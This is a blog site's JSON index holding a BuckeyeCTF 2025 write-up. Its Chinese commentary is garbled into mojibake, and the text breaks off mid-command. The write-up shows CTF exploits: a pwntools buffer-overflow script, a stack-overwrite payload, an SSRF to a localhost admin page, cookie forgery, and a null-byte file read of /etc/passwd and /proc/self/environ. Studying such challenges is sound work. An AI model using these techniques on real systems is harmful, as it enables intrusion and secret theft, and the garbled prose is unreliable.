{"meta":{"title":"Hexo","subtitle":"","description":"hi","author":null,"url":"https://archer-baiyi.github.io","root":"/"},"pages":[{"title":"","date":"2025-03-28T23:35:22.524Z","updated":"2025-03-28T23:33:52.530Z","comments":true,"path":"googlecbf54c20e5418f2c.html","permalink":"https://archer-baiyi.github.io/googlecbf54c20e5418f2c.html","excerpt":"","text":"google-site-verification: googlecbf54c20e5418f2c.html"},{"title":"æ‰€æœ‰æ ‡ç­¾","date":"2025-03-03T17:42:52.310Z","updated":"2025-03-03T17:42:52.310Z","comments":true,"path":"tags/index.html","permalink":"https://archer-baiyi.github.io/tags/index.html","excerpt":"","text":""},{"title":"å‹é“¾","date":"2025-11-23T19:34:07.425Z","updated":"2025-03-09T23:52:24.022Z","comments":true,"path":"friends/index.html","permalink":"https://archer-baiyi.github.io/friends/index.html","excerpt":"","text":""},{"title":"","date":"2025-04-05T21:06:21.350Z","updated":"2025-04-05T21:06:21.350Z","comments":true,"path":"about/index.html","permalink":"https://archer-baiyi.github.io/about/index.html","excerpt":"","text":"æ•°å­¦ç ”ç©¶ç”Ÿï¼ŒCTFèŒæ–°"},{"title":"æ‰€æœ‰åˆ†ç±»","date":"2025-03-03T17:43:08.659Z","updated":"2025-03-03T17:43:08.659Z","comments":true,"path":"categories/index.html","permalink":"https://archer-baiyi.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"BuckeyeCTF 2025 Writeup","slug":"CTF/Writeup/BuckeyeCTF-2025-Writeup","date":"2025-11-08T20:36:40.000Z","updated":"2025-11-09T22:11:28.334Z","comments":true,"path":"2025/11/08/CTF/Writeup/BuckeyeCTF-2025-Writeup/","permalink":"https://archer-baiyi.github.io/2025/11/08/CTF/Writeup/BuckeyeCTF-2025-Writeup/","excerpt":"BuckeyeCTF 2025 æ¯”èµ›çš„é¢˜è§£ï¼Œæ¶‰åŠæ–¹å‘ï¼šWeb, Crypto, Pwn, Misc, Forensics","text":"Beginnerè¿™åœºæ¯”èµ›æ¯”è¾ƒç…§é¡¾æ–°æ‰‹æ‰€ä»¥ä¸“é—¨è®¾ç½®äº†Beginnerçš„éƒ¨åˆ†ã€‚ 1985 1234567Hey man, I wrote you that flag printer you asked for:begin 755 FLGPRNTR.COMMOAP!@#PD=`:`-&quot;I&amp;Z_6Z&#x27;`&amp;T&quot;&lt;TAP[1,,,#-(4A)7DQ1;AM.=5,:7W5_61EU;:T1U&amp;4=?1AY&gt;&amp;EAU95AU3AE)&amp;D=:&amp;T9O6%&lt;D`end é¦–å…ˆé€šè¿‡begin 755 FLGPRNTR.COM ... endåˆ¤æ–­å‡ºè¿™æ®µå†…å®¹æ˜¯uuencodeè¿‡çš„äºŒè¿›åˆ¶å†…å®¹ã€‚åå¼•å·åœ¨uuencodeé‡Œä»£è¡¨è¿™ä¸€è¡Œçš„é•¿åº¦æ˜¯ 0ï¼Œæ‰€ä»¥ä»£ç é‡ŒæŠŠå®ƒå•ç‹¬å½“æˆç©ºå—å¤„ç†ï¼Œæ‹¼èµ·æ¥å°±å¾—åˆ°çœŸæ­£çš„FLGPRNTR.COMçš„å­—èŠ‚åºåˆ—ã€‚ è¿˜åŸå‡ºæ¥çš„æ˜¯ä¸€ä¸ª.COM å°ç¨‹åºï¼š 1234567891011; SI = 001Ch æŒ‡å‘å¯†æ–‡; å¾ªç¯ï¼šé‡åˆ° &#x27;$&#x27; åœï¼Œå…¶ä»–å­—èŠ‚å°±åœ°å¼‚æˆ– 2Ahloop: lodsb cmp al, &#x27;$&#x27; je done xor al, 2Ah stosb jmp loopdone: mov dx, 001Ch ; è§£ç åçš„æ˜æ–‡èµ·å§‹ mov ah, 09h int 21h ; æ‰“å°ç›´åˆ° &#x27;$&#x27; ç”¨pythonæ¨¡æ‹Ÿä¸€ä¸‹å³å¯ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import binasciifrom io import StringIOuu_text = &quot;&quot;&quot;begin 755 FLGPRNTR.COMMOAP!@#PD=`:`-&quot;I&amp;Z_6Z&#x27;`&amp;T&quot;&lt;TAP[1,,,#-(4A)7DQ1;AM.=5,:7W5_61EU;:T1U&amp;4=?1AY&gt;&amp;EAU95AU3AE)&amp;D=:&amp;T9O6%&lt;D`end&quot;&quot;&quot;# --- uu è§£ç æˆ .COM çš„åŸå§‹å­—èŠ‚ ---data_lines = []capture = Falsefor line in StringIO(uu_text): line = line.rstrip(&quot;\\n&quot;) if line.startswith(&quot;begin &quot;): capture = True continue if line == &quot;end&quot;: break if not capture: continue if not line: continue # åå¼•å·ï¼ˆ`ï¼‰è¡¨ç¤ºç©ºè¡Œé•¿åº¦ 0ï¼Œä¹Ÿç®—ä¸€è¡Œæ•°æ® try: chunk = binascii.a2b_uu(line) except binascii.Error as e: # æœ‰äº›å®ç°æŠŠå®Œå…¨ç©ºè´Ÿè½½è¡Œå†™æˆ &quot;`&quot;ï¼Œä¹Ÿèƒ½æ­£å¸¸è§£ç ä¸º b&quot;&quot; if line.strip() == &quot;`&quot;: chunk = b&quot;&quot; else: raise data_lines.append(chunk)com_bytes = b&quot;&quot;.join(data_lines)# --- æ¨¡æ‹Ÿç¨‹åºé€»è¾‘ï¼šä» 0x1C èµ·ï¼Œé‡åˆ° &#x27;$&#x27; åœæ­¢ï¼Œå…¶ä½™å­—èŠ‚ XOR 0x2A ---start = 0x1Cout = []i = startwhile i &lt; len(com_bytes): b = com_bytes[i] if b == 0x24: # &#x27;$&#x27; break out.append(b ^ 0x2A) i += 1flag = bytes(out).decode(&quot;ascii&quot;, errors=&quot;replace&quot;)print(flag)# bctf&#123;D1d_y0u_Us3_An_3mul4t0r_Or_d3c0mp1lEr&#125; Augury 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import hashlibstored_data = &#123;&#125;def generate_keystream(i): return (i * 3404970675 + 3553295105) % (2 ** 32)def upload_file(): print(&quot;Choose a name for your file&quot;) name = input() if name in stored_data: print(&quot;There is already a file with that name&quot;) return print(&quot;Remember that your privacy is our top priority and all stored files are encrypted.&quot;) print(&quot;Choose a password&quot;) password = input() m = hashlib.shake_128() m.update(password.encode()) keystream = int.from_bytes(m.digest(4), byteorder=&quot;big&quot;) print(&quot;Now upload the contents of your file in hexadecimal&quot;) contents = input() b = bytearray(bytes.fromhex(contents)) for i in range(0, len(b), 4): key = keystream.to_bytes(4, byteorder=&quot;big&quot;) b[i + 0] ^= key[0] if i + 1 &gt;= len(b): continue b[i + 1] ^= key[1] if i + 2 &gt;= len(b): continue b[i + 2] ^= key[2] if i + 3 &gt;= len(b): continue b[i + 3] ^= key[3] keystream = generate_keystream(keystream) stored_data[name] = b print(&quot;Your file has been uploaded and encrypted&quot;)def view_files(): print(&quot;Available files:&quot;) for i in stored_data.keys(): print(i) print(&quot;Choose a file to get&quot;) name = input() if name not in stored_data: print(&quot;That file is not available&quot;) return print(stored_data[name].hex())def main(): print(&quot;Welcome to Augury&quot;) print(&quot;The best place for secure storage!&quot;) while True: print(&quot;Please select an option:&quot;) print(&quot;1. Upload File&quot;) print(&quot;2. View Files&quot;) print(&quot;3. Exit&quot;) choice = input() match choice: case &quot;1&quot;: upload_file() case &quot;2&quot;: view_files() case &quot;3&quot;: exit()main() ä»”ç»†é˜…è¯»ä»£ç å¯ä»¥å‘ç°å®ƒæ˜¯è¿™æ ·åŠ å¯†æ–‡ä»¶çš„ï¼š å°†è¾“å…¥çš„å¯†ç ä½œä¸ºseedç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œç„¶ååªå–å…¶å‰4ä¸ªå­—èŠ‚ï¼› å°†è¿™4ä¸ªå­—èŠ‚ä¸æ–‡ä»¶çš„å‰4ä¸ªå­—èŠ‚è¿›è¡Œå¼‚æˆ–ï¼› åˆ©ç”¨LCGï¼ˆçº¿æ€§åŒä½™æ–¹æ³•ï¼‰æ›´æ–°è¿™4ä¸ªå­—èŠ‚ï¼ˆç”Ÿæˆæ–°çš„4å­—èŠ‚ï¼‰ï¼› ç„¶åä¸æ–‡ä»¶çš„åç»­çš„4ä¸ªå­—èŠ‚è¿›è¡Œå¼‚æˆ–ï¼› ä»¥æ­¤ç±»æ¨â€¦ ä¹Ÿå°±æ˜¯è¯´åªè¦æˆ‘ä»¬çŸ¥æ™“seedï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ­£å¸¸è¿˜åŸæ–‡ä»¶å†…å®¹ã€‚ ä½†å®é™…ä¸Šè¿™é‡Œæœ‰ä¸ªæ¼æ´ï¼Œå³æˆ‘ä»¬åªè¦èƒ½çŸ¥é“ç¬¬ä¸€æ¬¡ç”Ÿæˆçš„éšæœºæ•°çš„å‰4ä¸ªå­—èŠ‚ï¼ˆä¸ä¸€å®šéœ€è¦çŸ¥é“å…·ä½“çš„seedï¼‰ï¼Œæˆ‘ä»¬ä¾¿èƒ½è¿˜åŸåç»­çš„å¯†ç æµå¹¶ä¸”è¿˜åŸåŠ å¯†æ–‡ä»¶ã€‚ è¿æ¥æœåŠ¡å™¨å¯ä»¥çœ‹åˆ°é‡Œé¢å·²ç»æœ‰ä¸€ä»½å·²ç»è¢«åŠ å¯†è¿‡çš„.pngæ–‡ä»¶ï¼š ä¼—æ‰€å‘¨çŸ¥ï¼Œå®Œæ•´çš„.pngæ–‡ä»¶çš„å¼€å¤´ä¸€å®šæ˜¯ï¼š 1234567891011121314151617181920212223242526272829303132333435from pathlib import PathA = 3404970675C = 3553295105MOD = 2 ** 32PNG8 = bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A])def lcg(x: int) -&gt; int: return (x * A + C) % MODin_path = Path(&quot;secret.txt&quot;) # ä»æœåŠ¡å™¨ä¸Šä¿å­˜ä¸‹æ¥çš„åŠ å¯†åçš„pngæ–‡ä»¶çš„hexout_path = Path(&quot;decrypted.png&quot;) # è¿˜åŸå‡ºæ¥çš„pngå›¾ç‰‡data_hex = &quot;&quot;.join(in_path.read_text().split())ct = bytearray(bytes.fromhex(data_hex))ks0_bytes = bytes([ct[0] ^ PNG8[0], ct[1] ^ PNG8[1], ct[2] ^ PNG8[2], ct[3] ^ PNG8[3]])ks = int.from_bytes(ks0_bytes, &quot;big&quot;)n = len(ct)for i in range(0, n, 4): key = ks.to_bytes(4, &quot;big&quot;) ct[i] ^= key[0] if i + 1 &lt; n: ct[i + 1] ^= key[1] if i + 2 &lt; n: ct[i + 2] ^= key[2] if i + 3 &lt; n: ct[i + 3] ^= key[3] ks = lcg(ks)pt = bytes(ct)out_path.write_bytes(pt) æœ€åä¾¿èƒ½å¾—åˆ°ï¼š ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“å›¾ç‰‡é‡Œçš„æ˜¯è°ã€‚ï¼‰ Cosmonaut 123Cosmonauts run their programs everywhere and all at once.Like on Windows!c05m0p0l174n_c0nn353ur_ Linuxä¸Šï¼š 123Cosmonauts run their programs everywhere and all at once.Like on Linux!bctf&#123;4_7ru3_ FreeBSDä¸Šï¼š 123Cosmonauts run their programs everywhere and all at once.Like on FreeBSD!kn0w5_n0_b0und5&#125; æˆåŠŸæ‹¿åˆ°å®Œæ•´flagï¼š 1bctf&#123;4_7ru3_c05m0p0l174n_c0nn353ur_kn0w5_n0_b0und5&#125; ebg13 é€šè¿‡è§‚å¯Ÿè¿™é“é¢˜çš„åå­—ä»¥åŠè¿™æ®µåŠ å¯†å†…å®¹ä¸éš¾çŸ¥é“è¿™é“é¢˜è·Ÿrot13æœ‰å…³ã€‚ çœ‹ä¸€çœ¼ç½‘é¡µï¼š ç½‘é¡µçš„ä¸»è¦é€»è¾‘åœ¨ç»™çš„server.jsæ–‡ä»¶é‡Œï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146import Fastify from &#x27;fastify&#x27;;import * as cheerio from &#x27;cheerio&#x27;;const FLAG = process.env.FLAG ?? &quot;bctf&#123;fake_flag&#125;&quot;;const INDEX_HTML = `&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1&quot; /&gt; &lt;title&gt;ebj13&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://unpkg.com/98.css&quot; /&gt; &lt;style&gt; body &#123; background: #008080; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; &#125; .window &#123; zoom: 1.5; width: 460px; &#125; .window-body &#123; text-align: center; &#125; form &#123; display: flex; justify-content: center; gap: 8px; flex-wrap: wrap; margin-top: 10px; &#125; input[type=&quot;text&quot;] &#123; width: 300px; &#125; .example-buttons &#123; display: flex; justify-content: center; gap: 8px; margin-top: 12px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;window&quot; role=&quot;application&quot;&gt; &lt;div class=&quot;title-bar&quot;&gt; &lt;div class=&quot;title-bar-text&quot;&gt;ebj13&lt;/div&gt; &lt;div class=&quot;title-bar-controls&quot;&gt; &lt;button aria-label=&quot;Minimize&quot;&gt;&lt;/button&gt; &lt;button aria-label=&quot;Maximize&quot;&gt;&lt;/button&gt; &lt;button aria-label=&quot;Close&quot;&gt;&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;window-body&quot;&gt; &lt;p&gt;&lt;strong&gt;Enter URL&lt;/strong&gt;&lt;/p&gt; &lt;form action=&quot;/ebj13&quot; method=&quot;get&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;url&quot; placeholder=&quot;Enter a URL&quot; id=&quot;urlInput&quot; /&gt; &lt;button type=&quot;submit&quot; class=&quot;button&quot;&gt;ebj13 it!&lt;/button&gt; &lt;/form&gt; &lt;div class=&quot;example-buttons&quot;&gt; &lt;button class=&quot;button&quot; type=&quot;button&quot; onclick=&quot;urlInput.value = &#x27;https://example.com&#x27;&quot;&gt;example.com&lt;/button&gt; &lt;button class=&quot;button&quot; type=&quot;button&quot; onclick=&quot;urlInput.value = &#x27;https://news.ycombinator.com&#x27;&quot;&gt;news.ycombinator.com&lt;/button&gt; &lt;/div&gt; &lt;p style=&quot;margin-top:10px;font-size:12px;&quot;&gt;Paste a full URL (including https://)&lt;/p&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; `;const fastify = Fastify(&#123; logger: true &#125;);function rot13(str) &#123; return str.replace(/[a-zA-Z]/g, (c) =&gt; String.fromCharCode( c.charCodeAt(0) + (c.toLowerCase() &lt; &#x27;n&#x27; ? 13 : -13) ) );&#125;function rot13TextNodes($, node) &#123; $(node) .contents() .each((_, el) =&gt; &#123; if (el.type === &#x27;text&#x27;) &#123; el.data = rot13(el.data); &#125; else &#123; rot13TextNodes($, el); &#125; &#125;);&#125;fastify.get(&#x27;/&#x27;, async (req, reply) =&gt; &#123; return reply.type(&#x27;text/html&#x27;).send(INDEX_HTML);&#125;);fastify.get(&#x27;/ebj13&#x27;, async (req, reply) =&gt; &#123; const &#123; url &#125; = req.query; if (!url) &#123; return reply.status(400).send(&#x27;Missing ?url parameter&#x27;); &#125; try &#123; const res = await fetch(url); const html = await res.text(); const $ = cheerio.load(html); rot13TextNodes($, $.root()); const modifiedHtml = $.html(); reply.type(&#x27;text/html&#x27;).send(modifiedHtml); &#125; catch (err) &#123; reply.status(500).send(`Error fetching URL`); &#125;&#125;);fastify.get(&#x27;/admin&#x27;, async (req, reply) =&gt; &#123; if (req.ip === &quot;127.0.0.1&quot; || req.ip === &quot;::1&quot; || req.ip === &quot;::ffff:127.0.0.1&quot;) &#123; return reply.type(&#x27;text/html&#x27;).send(`Hello self! The flag is $&#123;FLAG&#125;.`) &#125; return reply.type(&#x27;text/html&#x27;).send(`Hello $&#123;req.ip&#125;, I won&#x27;t give you the flag!`)&#125;)fastify.listen(&#123; port: 3000, host: &#x27;0.0.0.0&#x27; &#125;, (err, address) =&gt; &#123; if (err) throw err; console.log(`Server running at $&#123;address&#125;`);&#125;); å¯ä»¥çœ‹åˆ°æœ€åé‚£é‡Œï¼Œåªè¦è¾“å…¥ç¬¦åˆè¦æ±‚çš„æœ¬åœ°å›ç¯ç½‘å€ä¾¿å¯ä»¥å¾—åˆ°flagã€‚ æ‰€ä»¥è¯´ç›´æ¥è¾“å…¥1http://127.0.0.1:3000/admin ä¾¿å¯ä»¥æ‹¿åˆ°åŠ å¯†åçš„flagï¼š 1Uryyb frys! Gur synt vf opgs&#123;jung_unccraf_vs_v_hfr_guvf_jrofvgr_ba_vgfrys&#125;. è§£å¯†ä¸€ä¸‹ä¾¿æ˜¯ï¼š 1Hello self! The flag is bctf&#123;what_happens_if_i_use_this_website_on_itself&#125;. æˆ–è€…è¾“å…¥ 1https://ebg13.challs.pwnoh.io/ebj13?url=http://127.0.0.1:3000/admin å¯ä»¥ç›´æ¥åœ¨ç½‘ç«™ä¸Šæ‹¿åˆ°è§£å¯†åçš„å†…å®¹ï¼š 1Hello self! The flag is bctf&#123;what_happens_if_i_use_this_website_on_itself&#125;. hexv ç”±äºæ²¡æœ‰ç»™ä»»ä½•é™„ä»¶ï¼Œæ‰€ä»¥å…ˆè¿ä¸Šçœ‹çœ‹ï¼š æˆ‘ä»¬å¯ä»¥çœ‹åˆ°print_flagçš„åœ°å€ä»¥åŠstackä¸Šå½“å‰çš„å†…å®¹ã€‚æ‰€ä»¥æ€è·¯å¤§æ¦‚ç‡å°±æ˜¯å°è¯•å°†è¿”å›åœ°å€ä¿®æ”¹æˆprint_flagçš„åœ°å€ã€‚ ç»è¿‡å¤šæ¬¡å°è¯•å‘ç°çº¢è‰²çš„éƒ¨åˆ†æ˜¯stack canaryï¼Œè€Œé’è‰²çš„éƒ¨åˆ†æ˜¯è¿”å›åœ°å€ã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è¾“å…¥ï¼ˆæ³¨æ„ä¿æŒstack canaryçš„éƒ¨åˆ†ä¸å˜ï¼‰ 1str 41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414100e1e1c6d8edca3d0000000000000000e932e03913560000 å†è¾“å…¥quitä¾¿å¯ä»¥æ‹¿åˆ°flag 1bctf&#123;sur3_h0Pe_th1S_r3nderED_PR0pErly&#125; Mind Boggle 1-[-----&gt;+&lt;]&gt;++.++++.---.[-&gt;++++++&lt;]&gt;.[----&gt;+++&lt;]&gt;+.-[---&gt;++++&lt;]&gt;+.&gt;-[-----&gt;+&lt;]&gt;.---.+++++.++++++++++++.-----------.[-&gt;++++++&lt;]&gt;+.--------------.---.-.---.++++++.---.+++.+++++++++++.-------------.++.+..-.----.++...-[---&gt;++++&lt;]&gt;+.-[------&gt;+&lt;]&gt;..--.-[---&gt;++++&lt;]&gt;+.&gt;-[-----&gt;+&lt;]&gt;.---.++++++.+..++++++++++.------------.+++.-----.-.+++++..----.---.++++++.-..++.--.+.-.--.+++.---..--.++.++++++.----..+.---.+++.+++++++++++.-------------.++.+..-.----.++...-[---&gt;++++&lt;]&gt;+.-[------&gt;+&lt;]&gt;...--..+++.-.++.----.++.-.+++.-----.---.+++++.+.+.--..++++.------..+.+++++++++++++.&gt;-[-----&gt;+&lt;]&gt;.++...-.++++.---.----.++++++.+.----.-[---&gt;++++&lt;]&gt;.[----&gt;+++&lt;]&gt;+.+.--.++.--.++++++. ä¸éš¾å‘ç°è¿™æ˜¯brainfuckï¼Œæ‰€ä»¥éšä¾¿æ‰¾ä¸ªåœ¨çº¿ç¼–è¯‘çš„ç½‘ç«™å³å¯ï¼š å¾—åˆ° 1596D4E305A6E7430636A467762444E664E30677A583277306557565363313955636A467762444E66644768465830567559334A35554851784D453539 å†è§£ç ä¸€ä¸‹å³å¯ï¼š 1bctf&#123;tr1pl3_7H3_l4yeRs_Tr1pl3_thE_EncryPt10N&#125; Ramesses mainæ–‡ä»¶ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445from flask import Flask, render_template, request, make_response, redirect, url_forimport base64import jsonimport osflag = os.getenv(&quot;FLAG&quot;, &quot;bctf&#123;fake_flag&#125;&quot;)app = Flask(__name__)@app.route(&quot;/&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])def home(): if request.method == &quot;POST&quot;: name = request.form.get(&quot;name&quot;, &quot;&quot;) cookie_data = &#123;&quot;name&quot;: name, &quot;is_pharaoh&quot;: False&#125; encoded = base64.b64encode(json.dumps(cookie_data).encode()).decode() response = make_response(redirect(url_for(&quot;tomb&quot;))) response.set_cookie(&quot;session&quot;, encoded) return response return render_template(&quot;index.html&quot;)@app.route(&quot;/tomb&quot;)def tomb(): session_cookie = request.cookies.get(&quot;session&quot;) if not session_cookie: return redirect(url_for(&quot;home&quot;)) try: user = json.loads(base64.b64decode(session_cookie).decode()) except Exception: return redirect(url_for(&quot;home&quot;)) return render_template(&quot;tomb.html&quot;, user=user, flag=flag)@app.route(&quot;/logout&quot;)def logout(): response = make_response(redirect(url_for(&quot;home&quot;))) response.set_cookie(&quot;session&quot;, &quot;&quot;, expires=0) return responseif __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, port=8000) éšä¾¿æ³¨å†Œä¸ªè´¦å·å…ˆç™»å½•è¿›å»ï¼š å¯ä»¥çœ‹åˆ°æœ‰ä¸ªsession cookieã€‚ è§£ç ä¸€ä¸‹ï¼š å°†is_pharaohçš„falseæ”¹æˆtrueï¼Œä»»ä½•å°†åŸæœ¬çš„cookieä¿®æ”¹æˆæ–°çš„è¿™ä¸ªï¼š å†åˆ·æ–°ç½‘é¡µä¾¿å¯ä»¥ç›´æ¥çœ‹åˆ°flagï¼š 1bctf&#123;s0_17_w45_wr177en_50_1t_w45_d0n3&#125; The Professorâ€™s Files è¿™é“é¢˜ä¼šæ‹¿åˆ°ä¸€ä»½docxæ–‡ä»¶ï¼š æ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šçš„å†…å®¹ã€‚ æƒ³åˆ°docxæ–‡ä»¶æœ¬èº«å°±ç®—zipçš„æ ¼å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†æ–‡ä»¶ç»“å°¾ä¿®æ”¹æˆzipæ–‡ä»¶å¹¶è§£å‹å®ƒï¼Œä¹‹åä¾¿èƒ½åœ¨é‡Œé¢çš„theme1.xmlé‡Œæ‰¾åˆ°flagï¼š 12345678910111213141516171819202122232425262728293031323334&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;a:theme xmlns:a=&quot;http://schemas.openxmlformats.org/drawingml/2006/main&quot; name=&quot;ProfessorTheme_Loud&quot;&gt; &lt;a:themeElements&gt; &lt;a:clrScheme name=&quot;CustomLoud&quot;&gt; &lt;a:dk1&gt;&lt;a:srgbClr val=&quot;1F1F1F&quot;/&gt;&lt;/a:dk1&gt; &lt;a:lt1&gt;&lt;a:srgbClr val=&quot;FFFFFF&quot;/&gt;&lt;/a:lt1&gt; &lt;a:dk2&gt;&lt;a:srgbClr val=&quot;2B2B2B&quot;/&gt;&lt;/a:dk2&gt; &lt;a:lt2&gt;&lt;a:srgbClr val=&quot;F4F4F4&quot;/&gt;&lt;/a:lt2&gt; &lt;a:accent1&gt;&lt;a:srgbClr val=&quot;FF4500&quot;/&gt;&lt;/a:accent1&gt; &lt;!-- vivid orange --&gt; &lt;a:accent2&gt;&lt;a:srgbClr val=&quot;0066CC&quot;/&gt;&lt;/a:accent2&gt; &lt;!-- strong blue --&gt; &lt;a:accent3&gt;&lt;a:srgbClr val=&quot;8A2BE2&quot;/&gt;&lt;/a:accent3&gt; &lt;!-- bright purple --&gt; &lt;a:accent4&gt;&lt;a:srgbClr val=&quot;228B22&quot;/&gt;&lt;/a:accent4&gt; &lt;!-- strong green --&gt; &lt;a:accent5&gt;&lt;a:srgbClr val=&quot;FFD700&quot;/&gt;&lt;/a:accent5&gt; &lt;!-- gold --&gt; &lt;a:accent6&gt;&lt;a:srgbClr val=&quot;DC143C&quot;/&gt;&lt;/a:accent6&gt; &lt;!-- crimson --&gt; &lt;!-- bctf&#123;docx_is_zip&#125; --&gt; &lt;a:hlink&gt;&lt;a:srgbClr val=&quot;0000FF&quot;/&gt;&lt;/a:hlink&gt; &lt;a:folHlink&gt;&lt;a:srgbClr val=&quot;800080&quot;/&gt;&lt;/a:folHlink&gt; &lt;/a:clrScheme&gt; &lt;a:fmtScheme name=&quot;CustomFmt&quot;&gt; &lt;a:fillStyleLst&gt; &lt;a:solidFill&gt;&lt;a:srgbClr val=&quot;FFFFFF&quot;/&gt;&lt;/a:solidFill&gt; &lt;/a:fillStyleLst&gt; &lt;a:lnStyleLst/&gt; &lt;a:effectStyleLst/&gt; &lt;/a:fmtScheme&gt; &lt;/a:themeElements&gt; &lt;a:objectDefaults/&gt; &lt;a:extraClrSchemeLst/&gt;&lt;/a:theme&gt; 1bctf&#123;docx_is_zip&#125; Viewer 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include &lt;stdbool.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;typedef enum &#123; INVALID, FIBONACCI, ART, FLAG, RANDOM&#125; viewee_t;void handle_viewee(viewee_t viewee) &#123; int a, b, c; int i; FILE *file; char flag_char; switch (viewee) &#123; case INVALID: printf(&quot;Error: Unauthorized or invalid input\\n&quot;); break; case FIBONACCI: a = 0; b = 1; for (i = 0; i &lt; 10; i++) &#123; c = a + b; a = b; b = c; printf(&quot;%i: %i\\n&quot;, i, a); &#125; break; case ART: printf(&quot; ||/\\\\\\n&quot; &quot; || \\\\\\n&quot; &quot; | \\\\\\n&quot; &quot; /______\\\\\\n&quot; &quot;/| |\\\\\\n&quot; &quot; | || |\\n&quot; &quot; |__||__|\\n&quot;); break; case FLAG: file = fopen(&quot;flag.txt&quot;, &quot;r&quot;); while (fread(&amp;flag_char, sizeof(flag_char), 1, file) == sizeof(flag_char)) &#123; putchar(flag_char); &#125; putchar(&#x27;\\n&#x27;); fclose(file); break; case RANDOM: printf(&quot;Rand: %i\\n&quot;, rand()); break; &#125;&#125;int main() &#123; viewee_t viewee = INVALID; char input[10]; bool is_admin = false; setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); printf(&quot;What would you like to view?\\n&gt; &quot;); gets(input); if (strcmp(input, &quot;fibonacci&quot;) == 0) &#123; viewee = FIBONACCI; &#125; else if (strcmp(input, &quot;art&quot;) == 0) &#123; viewee = ART; &#125; else if (strcmp(input, &quot;flag&quot;) == 0 &amp;&amp; is_admin) &#123; viewee = FLAG; &#125; else if (strcmp(input, &quot;random&quot;) == 0) &#123; viewee = RANDOM; &#125; handle_viewee(viewee); return 0;&#125; ä¸éš¾å‘ç°buffer overflowçš„æ¼æ´ï¼š 123char input[10];gets(input); æ‰€ä»¥æˆ‘ä»¬ç›´æ¥è¶Šç•Œå†™å…¥å°†adminä¿®æ”¹æˆ1å³å¯ï¼š 12345678910111213from pwn import *context.log_level = &#x27;info&#x27;r = remote(&quot;viewer.challs.pwnoh.io&quot;, 1337, ssl=True)offset = 10payload = b&quot;flag\\x00&quot; + b&quot;A&quot;*(offset - len(&quot;flag&quot;)) + b&quot;\\x01&quot;r.sendlineafter(b&quot;&gt; &quot;, payload)print(r.recvall())# bctf&#123;I_C4nt_Enum3rAte_7hE_vuLn3r4biliTI3s&#125; WebAwklet é¦–å…ˆæ³¨æ„åˆ°ç½‘ç«™ä¼šæŠŠæˆ‘ä»¬è¾“å…¥çš„font_nameå’Œ .txt ç›´æ¥æ‹¼æ¥ã€‚å¹¶ä¸”è‡ªå¸¦çš„ urldecode() ä¼šæŠŠ %00 è¿˜åŸåˆ°å®é™…å­—èŠ‚æµã€‚æ‰€ä»¥åœ¨åº•å±‚æ–‡ä»¶æ‰“å¼€ï¼ˆgetline &lt; filename â†’ fopen()ï¼‰æ—¶ï¼Œè·¯å¾„é‡Œçš„ \\x00 è¢«è§†ä¸ºå­—ç¬¦ä¸²ç»ˆæ­¢ï¼Œä»è€ŒæŠŠåç¼€ .txt æˆªæ‰ã€‚ ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶ï¼Œæ¯”å¦‚è¯´ä¼  font=/etc/passwd%00 å®é™…æ‰“å¼€çš„æ˜¯ /etc/passwdã€‚å¹¶ä¸”ç”±äºè¯»åˆ°çš„æ–‡ä»¶ä¼šè¢«å½“ä½œâ€œå­—ä½“â€ï¼ŒæŒ‰ç…§ 7 è¡Œ = 1 å— ç¼“å­˜åœ¨æ•°ç»„é‡Œï¼›è¯·æ±‚å‚æ•° name çš„å­—ç¬¦ç¼–ç ï¼ˆä» ASCII 32 èµ·ï¼‰é€‰æ‹©ç¬¬å‡ å—è¾“å‡ºã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç¨³å®šåœ°æŒ‰å—æ³„éœ²ä»»æ„æ–‡ä»¶å†…å®¹ã€‚ æœ€ç®€å•çš„æ–¹æ³•ï¼š 123456789â””â”€$ curl -s &#x27;https://awklet.challs.pwnoh.io/cgi-bin/awklet.awk?font=/proc/self/environ%00&amp;name=%20&#x27; \\| tr &#x27;\\0&#x27; &#x27;\\n&#x27; | grep -aoE 